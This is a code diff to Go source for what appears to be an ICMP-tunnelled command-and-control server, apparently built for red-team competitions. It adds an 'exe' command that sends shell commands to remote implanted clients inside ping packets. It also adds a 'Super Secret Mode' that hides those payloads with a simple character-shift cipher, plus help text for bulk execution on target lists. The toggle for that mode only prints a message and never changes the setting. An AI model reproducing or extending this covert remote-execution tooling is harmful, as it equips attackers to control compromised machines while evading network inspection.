@@ -14,10 +14,11 @@ import (
 
 var clients = make(map[int]string)
 var PacketQueue []icmp.Message
-var SSM bool = true
+var SSM bool = false
 var execute = false
 var ID int = 0
 var c, ListenerError = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
+var EncryptValue = 3
 
 func print_title() {
 	fmt.Println(".__                          ___             .__.__    ___")
@@ -28,6 +29,27 @@ func print_title() {
 	fmt.Println("        \\/      |__|        \\__\\      \\/               /__/")
 	fmt.Println("We are so back.")
 	fmt.Println("Type \"help\" for list of commands.")
+}
+
+func print_help() {
+	fmt.Println("\tadd <IP ADDRESS>               Adds new client by IP")
+	fmt.Println("\tls                             Show all added clients")
+	fmt.Println("\trm <ID>                        Removes a client by ID")
+	fmt.Println("\tremoveallclients               Removes all clients")
+	fmt.Println("\tsend <ID> <message>            Send message to client at ID")
+	fmt.Println("\texe <ID> <command>             Send command to client at ID")
+	// fmt.Println("\tsendtoall <message>            Sends <message> to all clients")
+	// fmt.Println("\texeonall <command>             Execute <command> on all clients")
+	// fmt.Println("\tsendtoteam <team> <command>    Send <command> to all <team> clients")
+	// fmt.Println("\texeonteam <team> <command>     Execute <command> on all <team> clients")
+	// fmt.Println("\texeonbox <oct>.<oct> <command> Execute <command> on all specific box")
+	fmt.Println("\tload                           Loads all clients specified in targets.txt")
+	// fmt.Println("\tcheckalive                     Generates a board of replying clients")
+	// [FIX] fmt.Println("\tshell <ID>                     Creates a direct line with client at ID")
+	fmt.Println("\tkill                           Stops server")
+	// fmt.Println("\tssm                            Toggles Super Secret Mode")
+	// fmt.Println("\tdebug                          Toggles Debug")
+	fmt.Println("\thelp                           Prints this")
 }
 
 func AddClient(ip string) {
@@ -93,6 +115,9 @@ func GenerateHeader(segment int, segmented bool, ip string) string {
 }
 
 func MakePacket(payload string) {
+	if SSM {
+		payload = encrypt(payload)
+	}
 	packet := icmp.Message{
 		Type: ipv4.ICMPTypeEcho,
 		Code: 0,
@@ -124,8 +149,7 @@ func Send(message string, id int) {
 	if len(message) > 1460 {
 		// Handle large payloads
 	} else {
-		header := GenerateHeader(0, false, clients[id])
-		payload := header + message
+		payload := GenerateHeader(0, false, clients[id]) + message
 		MakePacket(payload)
 		SendPackets(clients[id], *c)
 	}
@@ -150,6 +174,22 @@ func ParseID(args []string) (string, int) {
 	ParsedArgs := strings.SplitN(args[1], " ", 2)
 	id, _ := strconv.Atoi(ParsedArgs[0])
 	return ParsedArgs[1], id
+}
+
+func encrypt(plaintext string) string {
+	encrypted := ""
+	for i := range plaintext {
+		encrypted += string(rune(int(plaintext[i]) + 3))
+	}
+	return encrypted
+}
+
+func decrypt(plaintext string) string {
+	encrypted := ""
+	for i := range plaintext {
+		encrypted += string(rune(int(plaintext[i]) - 3))
+	}
+	return encrypted
 }
 
 func main() {
@@ -188,8 +228,19 @@ func main() {
 		case "load":
 			LoadClients()
 		case "send":
+			execute = false
 			message, id := ParseID(tokens)
 			Send(message, id)
+		case "exe":
+			execute = true
+			message, id := ParseID(tokens)
+			Send(message, id)
+		case "ssm":
+			if SSM {
+				fmt.Println("[DEBUG] Super Secret Mode disabled.")
+			} else {
+				fmt.Println("[DEBUG] Super Secret Mode enabled.")
+			}
 		case "kill":
 			print_title()
 			os.Exit(0)
